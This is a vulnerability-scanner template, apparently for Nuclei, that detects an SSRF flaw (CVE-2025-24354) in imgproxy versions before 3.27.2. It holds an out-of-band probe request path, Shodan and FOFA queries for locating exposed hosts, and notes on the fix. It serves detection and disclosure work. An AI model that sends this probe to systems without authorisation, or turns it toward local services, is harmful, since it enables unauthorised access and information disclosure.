http:
- matchers:
  - condition: and
    dsl:
    - contains(interactsh_protocol, 'http') || contains(interactsh_protocol, 'dns')
    - status_code == 422
    - contains(body, 'Invalid source image')
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/unsafe/plain/http://{{interactsh-url}}'
id: CVE-2025-24354
info:
  author: oksuzkayra
  classification:
    cve-id: CVE-2025-24354
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cwe-id: CWE-918
    epss-percentile: 0.8563
    epss-score: 0.02791
  description: 'imgproxy contains an issue caused by not blocking the 0.0.0.0 address
    even when IMGPROXY_ALLOW_LOOPBACK_SOURCE_ADDRESSES is set to false, letting local
    services be exposed, exploit requires network access.

    '
  impact: 'Local services may be exposed to unauthorized access, risking information
    disclosure or local system compromise.

    '
  metadata:
    fofa-query: body="imgproxy"
    max-request: 1
    product: imgproxy
    shodan-query: http.html:"imgproxy"
    verified: true
  name: Imgproxy < 3.27.2 - Server-Side Request Forgery (SSRF)
  reference:
  - https://github.com/imgproxy/imgproxy/commit/3d4fed6842aa8930ec224d0ad75b0079b858e081
  - https://github.com/imgproxy/imgproxy/security/advisories/GHSA-j2hp-6m75-v4j4
  remediation: 'The vulnerability has been fixed in imgproxy version 3.27.2. The fix
    involves updating the source address verification to also check for unspecified
    IP addresses (0.0.0.0) using the ip.IsUnspecified() function in addition to the
    existing ip.IsLoopback() check.

    '
  severity: medium
  tags: cve,cve2025,imgproxy,ssrf,oast,oob,vkev
